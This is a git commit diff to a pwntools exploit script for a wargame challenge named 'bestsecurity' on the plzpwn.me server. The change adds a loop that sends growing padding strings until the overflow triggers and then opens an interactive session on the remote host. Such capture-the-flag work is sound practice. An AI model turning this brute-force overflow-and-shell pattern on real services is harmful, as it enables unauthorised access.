305a6db5be39d1bcb907122d3917bb038576c781
tabdiukov <tabdiukov@gmail.com>
2019-06-17 17:00:26 +1000

    Bestsec... SMASHED :D

--- Wargames/2002_bestsec.py
+++ Wargames/2002_bestsec.py
@@ -8,9 +8,8 @@ OFFSET = 16
 
 
 def io_beg():
-	return process('./bestsecurity')
-	#remote('plzpwn.me', 2002)
-	#process('./jump')
+	return remote('plzpwn.me', 2002)
+	#process('./bestsecurity')
 	
 def io_rdy(x):
 	return x.recvuntil("AAAAw, yeah...".encode(ENCODING), timeout = 10).decode(ENCODING)
@@ -21,12 +20,33 @@ def main():
 	
 	while(fin < 1):
 		if(stage == 0):
+			found = 0
+			i = 1
+			good_magic = "calm down"
+			
+			while(not(found)):
+				io = io_beg()
+				io_rdy(io)
+				payload = "1234"*i
+				io.sendline(payload.encode(ENCODING))
+				inbound = io.recvall(timeout=5).decode(ENCODING)
+				if(inbound.find(good_magic) != -1):
+					print(inbound)
+					found = 1
+				else:
+					i = i+1
+					
+				print("[i: "+ str(i)+"][found: "+str(found)+"]")
+				
+			stage = stage + 1
+		
+		if(stage == 1):
 			io = io_beg()
 			io_rdy(io)
-			payload = "1337"*9
+			payload = "1234"*i
+			
 			io.sendline(payload.encode(ENCODING))
-			#print io.recvuntil("calm down.")
-			#io.sendline("ls")
+			
 			io.interactive()
 
 		else:
